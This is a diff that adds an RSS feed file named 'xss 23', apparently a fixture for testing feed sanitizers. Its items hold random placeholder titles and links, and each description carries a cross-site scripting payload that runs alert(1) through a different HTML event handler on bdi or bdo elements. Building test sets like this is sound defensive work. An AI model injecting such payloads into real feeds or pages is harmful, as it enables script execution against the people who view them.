@@ -1,0 +1,183 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0">
+<channel>
+  <title>xss 23</title>
+  <link>https://www.PUSXZVPUNCAVFQSXAGSD.com</link>
+  <description>IIJXWHOJZOTUOVUFTRDO</description>
+  <item>
+    <title>SVXICRJEEQJXRHIBLYUC</title>
+    <link>http://wwww.TVZANXNJAXWQXXMWAZUQSCKJGDDJBZGJERPSIAWV.com</link>
+    <description>
+      <bdi onmouseenter="alert(1)">test</bdi>
+    </description>
+  </item>
+  <item>
+    <title>DRYLPKCLIBCPXUTJORCN</title>
+    <link>http://wwww.YIIJZMBVKWRMEZUQHTREKAAMZRDDCRIVEFYTVTMV.com</link>
+    <description>
+      <bdi onmouseleave="alert(1)">test</bdi>
+    </description>
+  </item>
+  <item>
+    <title>WCQTBJYYOVLXUDXQBTVC</title>
+    <link>http://wwww.BJYGNRZCDLBPVBABYXTXGUKSOVMHCICROXCYVNAA.com</link>
+    <description>
+      <bdi onmousemove="alert(1)">test</bdi>
+    </description>
+  </item>
+  <item>
+    <title>GKADCOZUPRMXEYBUMMYJ</title>
+    <link>http://wwww.ZPVOBZKQPKHZMGEZREWFSEYUFCOVIHZUHFBHSJVS.com</link>
+    <description>
+      <bdi onmouseout="alert(1)">test</bdi>
+    </description>
+  </item>
+  <item>
+    <title>OWDVQEBGBIJXHRPBNYJJ</title>
+    <link>http://wwww.EHIKAMFQSELWPONDROLGJNOWDAFJFSUHCCPNSFBB.com</link>
+    <description>
+      <bdi onmouseover="alert(1)">test</bdi>
+    </description>
+  </item>
+  <item>
+    <title>VDBXHMAHJJPINJZRGMTE</title>
+    <link>http://wwww.PHSQPXLOIUKXRMRGZNWTVEIUGTYJCNVVVWQSTNZQ.com</link>
+    <description>
+      <bdi onmouseup="alert(1)">test</bdi>
+    </description>
+  </item>
+  <item>
+    <title>DUMETJEVWSUERMCLZPLK</title>
+    <link>http://wwww.CDGVYJKQJMJBYHDKBLAYGSQNTNMAEPONRPLLZRZA.com</link>
+    <description>
+      <bdi onpaste="alert(1)" contenteditable>test</bdi>
+    </description>
+  </item>
+  <item>
+    <title>DJOCJXVIXVCPUUXBRMPI</title>
+    <link>http://wwww.HCZLBSOSBPPITOZFABMQCWJKIUGDOENUWKTLADZU.com</link>
+    <description>
+      <bdo draggable="true" ondrag="alert(1)">test</bdo>
+    </description>
+  </item>
+  <item>
+    <title>WGOGUCYOVUKHGMQSQHBU</title>
+    <link>http://wwww.AAVAAQSJDAYMRYNEVZMTVDRWRFNKJAZSCGOFIUFV.com</link>
+    <description>
+      <bdo draggable="true" ondragend="alert(1)">test</bdo>
+    </description>
+  </item>
+  <item>
+    <title>CWMUETTFMWJHDYKLZAIR</title>
+    <link>http://wwww.KKJCVDOVZTKTKCSZIKIXJOIHAVDCOXSAZYVPTLBB.com</link>
+    <description>
+      <bdo draggable="true" ondragenter="alert(1)">test</bdo>
+    </description>
+  </item>
+  <item>
+    <title>KVGUGNEJWMBXVQCEGJWL</title>
+    <link>http://wwww.OKHNSOBMQFNMKNOHDTWJCDPTQVFYWXBXOOHFNNCG.com</link>
+    <description>
+      <bdo draggable="true" ondragleave="alert(1)">test</bdo>
+    </description>
+  </item>
+  <item>
+    <title>DDUMCRLAOHKLYHPYXXYQ</title>
+    <link>http://wwww.TTPSIPUXRRLBBSWKVCOGCYXJSLDDWLMUVSTFQYXH.com</link>
+    <description>
+      <bdo draggable="true" ondragstart="alert(1)">test</bdo>
+    </description>
+  </item>
+  <item>
+    <title>OQPOSBAOAMLRQLKXZOCG</title>
+    <link>http://wwww.KTAPDXUKETLJXFNVDJRNMFDFVWOAZIRDBJXQADUK.com</link>
+    <description>
+      <bdo   onactivate=alert(1)></bdo>
+    </description>
+  </item>
+  <item>
+    <title>TUSIFFWSBQYFNIZZXDRV</title>
+    <link>http://wwww.NULKTSDFUKSLLUQCLMGZJJELHNNNFRFHWIFLWSOD.com</link>
+    <description>
+      <bdo   onbeforeactivate=alert(1)></bdo>
+    </description>
+  </item>
+  <item>
+    <title>MKUMNBXFUHAZVLOMFYGB</title>
+    <link>http://wwww.ZCPJNHHNMAIEISYFFPPIBAKRYREQYXGJYUGMROHA.com</link>
+    <description>
+      <bdo   onbeforedeactivate=alert(1)></bdo><input autofocus>
+    </description>
+  </item>
+  <item>
+    <title>GCUJGTPNOBXINFEPDMJR</title>
+    <link>http://wwww.AKQXOITVUXWXISJMGNTELRHYFHIIEUTRSORZNKBO.com</link>
+    <description>
+      <bdo   ondeactivate=alert(1)></bdo><input id=y autofocus>
+    </description>
+  </item>
+  <item>
+    <title>PXRZNEOFEAEGZJZOJMNX</title>
+    <link>http://wwww.WGTUALPZTXHGFKLUIGNSLFHMYWNKTLSFFDQEDNDO.com</link>
+    <description>
+      <bdo   onfocus=alert(1)></bdo>
+    </description>
+  </item>
+  <item>
+    <title>HWCDKAOQMVWATMBYWCWH</title>
+    <link>http://wwww.JGADDYIDNMCIIQOMOLZHLZAQSOQGVTUBDWOXUWHX.com</link>
+    <description>
+      <bdo   onfocusin=alert(1)></bdo>
+    </description>
+  </item>
+  <item>
+    <title>VIJWWBWLCEPKPTSRHVZH</title>
+    <link>http://wwww.LFRVFJRTDUJCRBVMOGOYRGTPCEBDVKDOTSIBDPES.com</link>
+    <description>
+      <bdo onbeforecopy="alert(1)" contenteditable>test</bdo>
+    </description>
+  </item>
+  <item>
+    <title>KMDUEEVDMUVGCEVRONCK</title>
+    <link>http://wwww.EPSLTMQAWFINZFKRBRDFMBBGFXZEFCUTKXTVCKKS.com</link>
+    <description>
+      <bdo onbeforecut="alert(1)" contenteditable>test</bdo>
+    </description>
+  </item>
+  <item>
+    <title>GDMNQXEQQPZROZUVEAMF</title>
+    <link>http://wwww.XPKFMJYSRJSISIJJYTSYRSGSNDVDHDIEURELNSAR.com</link>
+    <description>
+      <bdo onbeforepaste="alert(1)" contenteditable>test</bdo>
+    </description>
+  </item>
+  <item>
+    <title>SURZINZUZYWIEPAMLGQF</title>
+    <link>http://wwww.SLWOUCVCWZJITLIMSHOWILUGZRHLEGZYMRAZZNLZ.com</link>
+    <description>
+      <bdo onblur=alert(1)  ></bdo><input autofocus>
+    </description>
+  </item>
+  <item>
+    <title>QIYZINHFDXVBXYSGPDLU</title>
+    <link>http://wwww.FLDYDKSHMTFBCEDPXESKGQUVQREGNRAGYDLTRHTS.com</link>
+    <description>
+      <bdo onclick="alert(1)">test</bdo>
+    </description>
+  </item>
+  <item>
+    <title>NCAPVAUPQCPKBIXGVHMU</title>
+    <link>http://wwww.VOVHRQKWTLWUDRFZNWTAIPLNKFKFRJGXYWLPDYHD.com</link>
+    <description>
+      <bdo oncontextmenu="alert(1)">test</bdo>
+    </description>
+  </item>
+  <item>
+    <title>FHNVQCYMQMGADEVVWRMU</title>
+    <link>http://wwww.IWGAANJTQZPFGAXECMVAJTMAWDDVQPUGXLOOPGGR.com</link>
+    <description>
+      <bdo oncopy="alert(1)" contenteditable>test</bdo>
+    </description>
+  </item>
+</channel>
+</rss>
